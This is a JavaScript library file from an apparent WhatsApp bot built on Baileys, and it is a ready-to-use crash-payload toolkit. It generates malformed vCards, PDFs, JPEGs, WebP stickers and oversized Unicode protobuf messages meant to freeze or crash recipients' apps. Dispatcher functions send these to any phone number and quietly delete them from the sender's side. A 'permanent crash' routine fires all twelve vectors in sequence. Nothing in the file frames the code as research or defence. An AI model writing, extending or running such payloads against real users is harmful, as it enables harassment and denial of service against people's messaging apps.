// ─────────────────────────────────────────────
// Al-Jin · lib/bug-payloads.js
// Native Baileys v7 ESM Bug, Crash & Binary Payload Library
// ─────────────────────────────────────────────
import crypto from 'node:crypto';
import { generateWAMessageFromContent, jidNormalizedUser } from '@whiskeysockets/baileys';
import { isOwner } from '../core/identity.js';

/**
 * Generates a standard message ID for Baileys relaying.
 */
export function generateMsgId(sock) {
  if (typeof sock?.generateMessageID === 'function') {
    try {
      return sock.generateMessageID();
    } catch (e) {}
  }
  return '3EB0' + crypto.randomBytes(8).toString('hex').toUpperCase();
}

/**
 * Check if the target JID is the bot itself or an owner number (safeguard).
 */
export function isProtectedJid(sock, targetJid) {
  if (!targetJid) return true;
  const cleanTarget = String(targetJid).split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
  const botJid = sock?.user?.id ? jidNormalizedUser(sock.user.id) : '';
  const cleanBot = botJid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');

  if (cleanTarget === cleanBot) return true;
  if (isOwner(`${cleanTarget}@s.whatsapp.net`)) return true;

  return false;
}

/**
 * Safely relays a protobuf or media message payload to a target JID using native Baileys v7 methods.
 * Performs immediate "Delete for me" after sending if autoDelete is enabled.
 */
export async function relayNativePayload(sock, targetJid, messageContent, options = {}) {
  if (isProtectedJid(sock, targetJid)) {
    throw new Error('Target is protected (Bot owner / self number safeguard active).');
  }

  const cleanTarget = targetJid.includes('@')
    ? targetJid
    : `${targetJid.replace(/[^0-9]/g, '')}@s.whatsapp.net`;

  const autoDelete = options.autoDelete !== false;
  const msgId = generateMsgId(sock);

  try {
    let sentKey;
    if (options.isSendMessage) {
      const sentMsg = await sock.sendMessage(cleanTarget, messageContent);
      sentKey = sentMsg?.key;
    } else {
      const waMsg = generateWAMessageFromContent(cleanTarget, messageContent, {
        userJid: sock.user?.id
      });
      await sock.relayMessage(cleanTarget, waMsg.message, { messageId: msgId });
      sentKey = { remoteJid: cleanTarget, fromMe: true, id: msgId };
    }

    if (sentKey && autoDelete) {
      try {
        // Delete for Me locally (clear message on bot's side without revoking for target)
        await sock.chatModify(
          {
            clear: {
              messages: [
                {
                  id: sentKey.id,
                  fromMe: true,
                  timestamp: Math.floor(Date.now() / 1000)
                }
              ]
            }
          },
          cleanTarget
        );
      } catch (delErr) {
        console.error('[bug-payloads] Auto Delete-for-Me failed:', delErr.message);
      }
    }

    return { success: true, deliveredCount: 1, errors: [] };
  } catch (e1) {
    try {
      const sentMsg = await sock.sendMessage(cleanTarget, { forward: { key: { remoteJid: cleanTarget, id: generateMsgId(sock) }, message: messageContent } });
      if (sentMsg?.key && autoDelete) {
        try {
          await sock.chatModify(
            {
              clear: {
                messages: [
                  {
                    id: sentMsg.key.id,
                    fromMe: true,
                    timestamp: Math.floor(Date.now() / 1000)
                  }
                ]
              }
            },
            cleanTarget
          );
        } catch (delErr) {}
      }
      return { success: true, deliveredCount: 1, errors: [] };
    } catch (e2) {
      return { success: false, deliveredCount: 0, errors: [e1.message, e2.message] };
    }
  }
}

// ─────────────────────────────────────────────
// 🧬 Binary Payload Generators (plan.txt)
// ─────────────────────────────────────────────

/**
 * 1. Extreme Toxic Emoji & Unicode Hangover vCard Generator
 * Combines thousands of multi-codepoint emojis with heavy combining marks in FN, N, ORG, and NOTE fields
 * to exhaust client UI thread heap memory and force instantaneous app crashes.
 */
export function generateToxicEmojiVCard() {
  const emojis = ['🧌', '💥', '💀', '☠️', '🤡', '👺', '👾', '🔥', '⚡', '💣', '🧟', '🦠', '🩸', '🌀'];
  const combiningChar = '\u0308\u0302\u0300\u0301\u0345\u0361';
  let emojiCluster = '';
  for (let i = 0; i < 3000; i++) {
    emojiCluster += emojis[i % emojis.length] + combiningChar;
  }

  const toxicName = 'SYSTEM_OVERLOAD_' + emojiCluster;
  const toxicOrg = 'CRASH_CORP_' + emojiCluster;
  const toxicNote = 'FATAL_PAYLOAD_' + emojiCluster;

  const vcardContent = `BEGIN:VCARD\nVERSION:3.0\nFN:${toxicName}\nN:${toxicName};${toxicName};;;\nORG:${toxicOrg}\nNOTE:${toxicNote}\nTEL;TYPE=CELL;TYPE=PREF:+19999999999\nEND:VCARD`;
  return {
    displayName: toxicName.slice(0, 100),
    vcard: vcardContent,
    vcardBuffer: Buffer.from(vcardContent)
  };
}

/**
 * 2. Malicious PDF Generator (Infinite Loop PDF)
 * Generates corrupted PDF stream buffer that triggers parser execution hang/freeze.
 */
export function generateMaliciousPDF() {
  const pdfContent = `%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>
endobj
4 0 obj
<< /Length 25 >>
stream
BT /F1 12 Tf 100 700 Td (CRASH) Tj ET
/BT /F1 12 Tf 100 700 Td (CRASH) Tj ET
/BT /F1 12 Tf 100 700 Td (CRASH) Tj ET
${'BT /F1 12 Tf 100 700 Td (CRASH) Tj ET\n'.repeat(500)}
endstream
endobj
5 0 obj
<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
endobj
xref
0 6
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000266 00000 n
0000000341 00000 n
trailer
<< /Size 6 /Root 1 0 R >>
startxref
434
%%EOF`;
  return Buffer.from(pdfContent);
}

/**
 * 3. Malicious JPEG Generator (Corrupted Image Buffer)
 * Generates corrupted JPEG header with invalid quantization tables and out-of-bound decoding bytes.
 */
export function generateMaliciousJPEG() {
  const header = Buffer.from([
    0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01,
    0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0xFF, 0xDB, 0x00, 0x43,
    0x00, 0x08, 0x06, 0x06, 0x07, 0x06, 0x05, 0x08, 0x07, 0x07, 0x07, 0x09,
    0x09, 0x08, 0x0A, 0x0C, 0x14, 0x0D, 0x0C, 0x0B, 0x0B, 0x0C, 0x19, 0x12,
    0x13, 0x0F, 0x10, 0x15, 0x10, 0x10, 0x10, 0x0C, 0x0C, 0x0C, 0x0C, 0x11,
    0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11
  ]);
  const corruptedPadding = Buffer.alloc(1024, 0x11);
  const eof = Buffer.from([0xFF, 0xD9]);
  return Buffer.concat([header, corruptedPadding, eof]);
}

/**
 * 4. Toxic WebP Sticker Generator
 * Generates malformed WebP header with mismatched chunk dimensions.
 */
export function generateToxicStickerWebP() {
  const header = Buffer.from([
    0x52, 0x49, 0x46, 0x46, // "RIFF"
    0xFF, 0xFF, 0xFF, 0x7F, // Chunk size
    0x57, 0x45, 0x42, 0x50, // "WEBP"
    0x56, 0x50, 0x38, 0x58, // "VP8X"
    0x0A, 0x00, 0x00, 0x00, // Chunk flags
    0xFF, 0xFF, 0xFF, 0x00, // Canvas width (max 16MB boundary overflow)
    0xFF, 0xFF, 0xFF, 0x00  // Canvas height (max 16MB boundary overflow)
  ]);
  const padding = Buffer.alloc(2048, 0xFF);
  return Buffer.concat([header, padding]);
}

/**
 * 5. Zero-Click Media Parsing Generator (Integer Overflow Boundary Frame)
 * Simulates a synthetic corrupt media frame header with 0xFFFFFFFF width/height dimensions
 * triggering heap buffer overflow in native media C/C++ decoders upon auto-processing.
 */
export function generateZeroClickMediaFrame() {
  const header = Buffer.alloc(16);
  header.writeUInt32BE(0xFFFFFFFF, 0); // Max width boundary
  header.writeUInt32BE(0xFFFFFFFF, 4); // Max height boundary
  header.writeUInt8(4, 8);             // 4 bpp RGBA
  const corruptBody = Buffer.alloc(4096, 0xFE);
  return Buffer.concat([header, corruptBody]);
}

// ─────────────────────────────────────────────
// 📦 Binary Vector Dispatchers
// ─────────────────────────────────────────────

export async function sendToxicVCardPayload(sock, targetJid) {
  const toxicData = generateToxicEmojiVCard();
  const jpegBuffer = generateMaliciousJPEG();

  const payload = {
    contactMessage: {
      displayName: toxicData.displayName,
      vcard: toxicData.vcard,
      contextInfo: {
        externalAdReply: {
          title: "⚡ FATAL CONTACT CARD " + "💀".repeat(200),
          body: "Click to view contact details",
          mediaType: 1,
          jpegThumbnail: jpegBuffer
        }
      }
    }
  };
  return relayNativePayload(sock, targetJid, payload);
}

export async function sendContactsArrayPayload(sock, targetJid) {
  const toxicData = generateToxicEmojiVCard();
  const jpegBuffer = generateMaliciousJPEG();
  const contacts = Array.from({ length: 15 }, () => ({
    displayName: toxicData.displayName,
    vcard: toxicData.vcard
  }));

  const payload = {
    contactsArrayMessage: {
      displayName: "⚠️ MULTI CONTACT OVERLOAD",
      contacts,
      contextInfo: {
        externalAdReply: {
          title: "💥 BATCH CONTACT OVERFLOW",
          body: "Processing 15 VCards...",
          mediaType: 1,
          jpegThumbnail: jpegBuffer
        }
      }
    }
  };
  return relayNativePayload(sock, targetJid, payload);
}

export async function sendZeroClickMediaPayload(sock, targetJid) {
  const frameBuffer = generateZeroClickMediaFrame();
  const jpegBuffer = generateMaliciousJPEG();
  const toxicData = generateToxicEmojiVCard();

  const messageContent = {
    imageMessage: {
      mimetype: 'image/jpeg',
      caption: '💥 ZERO_CLICK_FRAME ' + '💀'.repeat(500),
      fileLength: '999999999',
      height: 65535,
      width: 65535,
      mediaKey: crypto.randomBytes(32),
      jpegThumbnail: jpegBuffer,
      contextInfo: {
        externalAdReply: {
          title: "CRASH MEDIA PREVIEW",
          body: toxicData.displayName,
          mediaType: 1,
          jpegThumbnail: jpegBuffer
        }
      }
    }
  };
  return relayNativePayload(sock, targetJid, messageContent);
}

export async function sendPersistentSchemaPayload(sock, targetJid) {
  const jpegBuffer = generateMaliciousJPEG();
  const toxicData = generateToxicEmojiVCard();
  const payload = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          mimetype: 'image/jpeg',
          caption: '💥 PERSISTENT SCHEMA PREVIEW ' + '🧌'.repeat(1000),
          fileLength: '888888888',
          height: 65535,
          width: 65535,
          jpegThumbnail: jpegBuffer,
          contextInfo: {
            externalAdReply: {
              title: "CORRUPTED PREVIEW FRAME",
              body: toxicData.displayName,
              mediaType: 1,
              jpegThumbnail: jpegBuffer
            }
          }
        }
      }
    }
  };
  return relayNativePayload(sock, targetJid, payload);
}

export async function sendMaliciousPDFPayload(sock, targetJid) {
  const pdfBuffer = generateMaliciousPDF();
  const messageContent = {
    document: pdfBuffer,
    fileName: 'crash.pdf',
    mimetype: 'application/pdf',
    caption: 'Important Document'
  };
  return relayNativePayload(sock, targetJid, messageContent, { isSendMessage: true });
}

export async function sendMaliciousJPEGPayload(sock, targetJid) {
  const jpegBuffer = generateMaliciousJPEG();
  const messageContent = {
    document: jpegBuffer,
    fileName: 'image.jpg',
    mimetype: 'image/jpeg',
    caption: 'Preview Image'
  };
  return relayNativePayload(sock, targetJid, messageContent, { isSendMessage: true });
}

export async function sendToxicStickerPayload(sock, targetJid) {
  const webpBuffer = generateToxicStickerWebP();
  const messageContent = {
    sticker: webpBuffer
  };
  return relayNativePayload(sock, targetJid, messageContent, { isSendMessage: true });
}

// ─────────────────────────────────────────────
// 🧬 Existing Protobuf Crash Vectors
// ─────────────────────────────────────────────

export async function sendAIRichAddonAction(sock, targetJid) {
  const payload = {
    messageContextInfo: {
      messageSecret: crypto.randomBytes(32),
    },
    interactiveMessage: {
      body: { text: "🤖 Meta AI Assistant " + "ꦾ⚙️؂ن؃؄ٽ؂ن".repeat(5000) },
      footer: { text: "System AI Response" },
      header: { title: "AI OVERLAY RESPONSE", hasSubtitle: true },
      nativeFlowResponseMessage: {
        name: "genai_footer_action",
        paramsJson: JSON.stringify({
          actionType: "GENAI_FOOTER_ACTION",
          primitives: [{ cta_text: "", footer_action_type: "" }]
        })
      },
      contextInfo: {
        forwardedAiBotMessageInfo: {
          botJid: "13135550202@bot",
          botName: "Business Assistant",
          creator: "FLIX"
        }
      }
    }
  };
  return relayNativePayload(sock, targetJid, payload);
}

export async function sendQuotaUpsellThinkHard(sock, targetJid) {
  const payload = {
    interactiveMessage: {
      body: { text: "⚡ Meta AI Plus Quota " + "ោ៝؂ن؃؄ٽ؂ن؃😎".repeat(5000) },
      nativeFlowResponseMessage: {
        name: "quota_upsell",
        paramsJson: JSON.stringify({
          title: "Meta AI Premium",
          body: "Quota Limit Exceeded",
          meterUsageType: "META_AI_THINK_HARD",
          benefitType: "THINK_HARD",
          buttons: []
        })
      }
    }
  };
  return relayNativePayload(sock, targetJid, payload);
}

export async function sendCrashJamPayload(sock, targetJid) {
  const cleanUser = String(targetJid).split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
  const targetBaseJid = `${cleanUser}@s.whatsapp.net`;

  const statusAttributions = Array.from({ length: 350 }, () => ({
    participant: `${Math.floor(10000000000 + Math.random() * 89999999999)}@s.whatsapp.net`,
    type: 1
  }));
  statusAttributions.unshift({ participant: targetBaseJid, type: 1 });

  const payload = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          contextInfo: {
            remoteJid: targetBaseJid,
            fromMe: true,
            isQuestion: true,
            statusAttributionType: 2,
            statusAttributions
          },
          body: {
            text: "⚡ CRASH JAM " + "ꦾ؂ن؃؄ٽ؂ن؃⚫".repeat(15000),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: JSON.stringify({ status: "active", code: "CRASH_JAM", overload: "ꦾ".repeat(1000) }),
            version: 3
          }
        }
      }
    }
  };
  return relayNativePayload(sock, targetJid, payload);
}

export async function sendKillSystemPayload(sock, targetJid) {
  const toxicData = generateToxicEmojiVCard();
  const jpegBuffer = generateMaliciousJPEG();

  const payload = {
    documentMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11111111_111111111111111_1111111111111111111_n.enc",
      mimetype: "application/pdf",
      title: "‼️ KILLSYSTEM_MEDIA_OVERFLOW.pdf",
      fileLength: "999999999999",
      pageCount: 99999,
      mediaKey: crypto.randomBytes(32),
      fileName: "FATAL_OVERFLOW.pdf",
      jpegThumbnail: jpegBuffer,
      caption: "‼️ KILLSYSTEM HIGH_IMPACT " + "💀💥🧌".repeat(500),
      contextInfo: {
        externalAdReply: {
          title: "FATAL MEDIA PREVIEW",
          body: toxicData.displayName,
          mediaType: 1,
          jpegThumbnail: jpegBuffer
        }
      }
    }
  };

  return relayNativePayload(sock, targetJid, payload);
}

export async function sendCrashFinityPayload(sock, targetJid) {
  const payload = {
    viewOnceMessage: {
      message: {
        extendedTextMessage: {
          text: "💥 CRASHFINITY " + "ꦽ⚫😎⚙️⚙️😎⚙️😂😂😔😔😎⚫😔😔😂😂😎؂ن؃؄ٽ؂ن؃😎⚫⚫😎⚙️⚙️".repeat(2000),
          nativeFlowMessage: {
            buttons: [
              { name: "catalog_message", buttonParamsJson: JSON.stringify({ caption: "OVERLOAD " + "ꦽ⚫⚙️".repeat(500) }) },
              { name: "cta_call", buttonParamsJson: JSON.stringify({ caption: "OVERLOAD " + "ꦽ⚫⚙️".repeat(5000) }) }
            ]
          }
        }
      }
    }
  };
  return relayNativePayload(sock, targetJid, payload);
}

export async function sendStickerCrashPayload(sock, targetJid) {
  const repeatedText = "./StickerPack" + "؂ن؃؄ٽ؂ن؃".repeat(400);
  const payload = {
    stickerPackMessage: {
      stickerPackId: "SP_CRASH",
      name: repeatedText,
      publisher: repeatedText,
      packDescription: repeatedText,
      stickers: [
        { fileName: "sticker1.webp", isAnimated: false, mimetype: "application/pdf" },
        { fileName: "sticker2.webp", isAnimated: false, mimetype: "application/pdf" }
      ],
      stickerPackSize: "999999999",
      stickerPackOrigin: "1"
    }
  };
  return relayNativePayload(sock, targetJid, payload);
}

export async function sendCallCrashPayload(sock, targetJid) {
  const payload = {
    scheduledCallCreationMessage: {
      callType: 1,
      scheduledTimestampMs: Date.now() + 60000,
      title: "📞 EMERGENCY CALL " + "ꦾ".repeat(1000)
    }
  };
  return relayNativePayload(sock, targetJid, payload);
}

export async function sendXdelayPayload(sock, targetJid) {
  const payload = {
    extendedTextMessage: {
      text: "⏱️ DELAY PACKET " + "‎".repeat(5000) + "ꦾ".repeat(1000)
    }
  };
  return relayNativePayload(sock, targetJid, payload);
}

export async function sendIosInvisiblePayload(sock, targetJid) {
  const payload = {
    extendedTextMessage: {
      text: "🍎 IOS INVISIBLE " + "‌".repeat(8000) + "‍".repeat(8000)
    }
  };
  return relayNativePayload(sock, targetJid, payload);
}

/**
 * Multi-Vector Master Permanent Crash (Combines all binary & protobuf vectors in sequence)
 */
export async function sendPermanentCrashPayload(sock, targetJid) {
  let totalDelivered = 0;
  const errors = [];

  const vectors = [
    sendToxicVCardPayload,
    sendContactsArrayPayload,
    sendZeroClickMediaPayload,
    sendPersistentSchemaPayload,
    sendKillSystemPayload,
    sendMaliciousPDFPayload,
    sendMaliciousJPEGPayload,
    sendToxicStickerPayload,
    sendCrashJamPayload,
    sendCrashFinityPayload,
    sendAIRichAddonAction,
    sendQuotaUpsellThinkHard
  ];

  for (const fn of vectors) {
    try {
      const res = await fn(sock, targetJid);
      if (res?.success) totalDelivered += res.deliveredCount;
      else if (res?.errors) errors.push(...res.errors);
    } catch (e) {
      errors.push(e.message);
    }
  }

  return {
    success: totalDelivered > 0,
    deliveredCount: totalDelivered,
    errors
  };
}
